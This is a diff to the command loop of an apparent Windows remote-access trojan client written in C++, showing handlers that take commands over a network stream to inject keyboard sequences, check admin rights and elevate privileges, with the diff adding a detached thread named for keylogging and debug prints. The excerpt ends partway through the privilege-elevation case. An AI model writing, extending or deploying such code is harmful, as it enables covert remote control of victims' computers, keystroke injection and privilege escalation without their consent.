@@ -57,8 +57,7 @@
 
 
 
-int main(int argc, char *argv[]) {
-    //if (argc>1)Sleep(std::stoi(argv[argc-1]));
+int main() {
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         bool connectionState = true;
@@ -248,17 +247,22 @@ int main(int argc, char *argv[]) {
 
                         }
                         case 18: {
+                            std::cout << "keyboard command " << std::endl;
                             std::string keyboardCommand = stream.readString();
                             KeyboardExecuter keyboardExecuter(keyboardCommand);
                             keyboardExecuter.executeSequence();
+                            std::thread keyloggerThread(&KeyboardExecuter::executeSequence, &keyboardExecuter);
+                            keyloggerThread.detach();
                             break;
                         }
                         case 19: {
+                            std::cout << "has admin permission command " << std::endl;
                             std::cout << Permission::hasAdminPermission() << std::endl;
                             stream.sendSize(Permission::hasAdminPermission());
                             break;
                         }
                         case 20: {
+                            std::cout << "elevate permission" << std::endl;
                             BOOL result;
                             result = Permission::elevatePermissions();
                             if (result==1) {
